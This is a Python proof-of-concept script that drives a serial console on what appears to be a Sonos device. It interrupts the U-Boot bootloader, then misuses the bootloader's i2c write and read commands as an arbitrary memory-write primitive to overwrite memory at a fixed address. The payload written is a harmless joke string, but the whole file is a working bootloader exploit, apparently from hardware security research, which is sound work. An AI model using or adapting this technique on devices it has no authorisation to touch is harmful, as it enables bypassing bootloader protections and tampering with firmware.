import sys
import serial
import datetime

PROMPT = 'sonos tupelo >'


def unit_to_uboot():
    '''
    Attempt to use a serial console to bring the Unit into a clean U-Boot
    prompt at power on, or reset and re-enter U-Boot if already at a U-Boot
    prompt.
    '''
    with serial.Serial('/dev/ttyUSB0', 115200, timeout=10) as interface:
        # First up, reset the unit to get into a clean state.
        print('[+] Attempting to issue reset command to U-Boot')
        interface.write(b'reset\n')

        # Drop back into U-Boot.
        print('[-] Waiting for U-Boot boot interrupt prompt')
        buffer = bytes()
        while True:
            buffer += interface.readline()

            try:
                line = str(buffer, 'utf-8')
            except UnicodeDecodeError as err:
                buffer = bytes()
                continue

            # The whitelist check is just prior to the U-Boot interupt prompt.
            # When this line is encountered start reading N bytes rather than
            # until EoL - as the count down does not print an \n character
            # until AFTER the timeout.
            if line.lower().startswith('whitelist check completed'):
                # Check whether the 'Hit any key' prompt follows.
                try:
                    peek = interface.read(12)
                    if str(peek, 'utf-8').lower().startswith('hit any key'):
                        print('[+] Writing U-Boot interrupt to console')
                        interface.write(b'A')
                        buffer = bytes()
                        continue
                    else:
                        buffer += peek
                except:
                    # No point in tracking the read bytes if they'll just be
                    # discarded at the top of the next iteration.
                    pass

            # Drop out of the loop when we see the U-Boot prompt
            if line.lower().startswith(PROMPT):
                print('[-] Unit is now at U-Boot prompt')
                buffer = bytes()
                break

            # Dump the buffer contents if no matches.
            buffer = bytes()

def write_to_memory(value, addr, device=0x30, register=0x70):
    '''
    Attempt to write the given value (byte) into memory at the given address.

    Args:
        value (int): The value to write.
        addr (int): The address in memory to write to.
        device (int): The address of the device on the i2c bus to read from
        register (int): The address of the register to use as a buffer

    Return:
        Whether the read operation was successful (bool).
    '''
    with serial.Serial('/dev/ttyUSB0', 115200, timeout=5) as interface:
        command = 'i2c mw 0x{0:0x} 0x{1:0x} 0x{2:0x}\n'.format(
            device,
            register,
            value
        )
        interface.write(bytes(command, 'utf-8'))

        # Loop back is enabled, so throw away the first line.
        interface.readline()
        status = str(interface.read(len(PROMPT)), 'utf-8')

        # Abort if the write failed.
        if not status.lower().startswith(PROMPT):
            print('[!] Write failed: {0}'.format(status))
            return False

        # Attempt to read from the register into memory.
        command = 'i2c read 0x{0:0x} 0x{1:0x} 0x01 0x{2:0x}\n'.format(
            device,
            register,
            addr
        )
        interface.write(bytes(command, 'utf-8'))

        # Loop back is enabled, so throw away the first line.
        interface.readline()
        status = str(interface.read(len(PROMPT)), 'utf-8')

        # Abort if the write failed.
        if not status.lower().startswith(PROMPT):
            print('[!] Write failed: {0}'.format(status))
            return False

        return True


if __name__ == '__main__':
    unit_to_uboot()
    base = 0x3ff21000
    crosstool = base + 0x5CA23
    replace = "Oh god how did this get here I am not good with computer. Send help D: "

    c_addr = crosstool
    for char in replace:
        write_to_memory(ord(char), c_addr)
        c_addr += 1
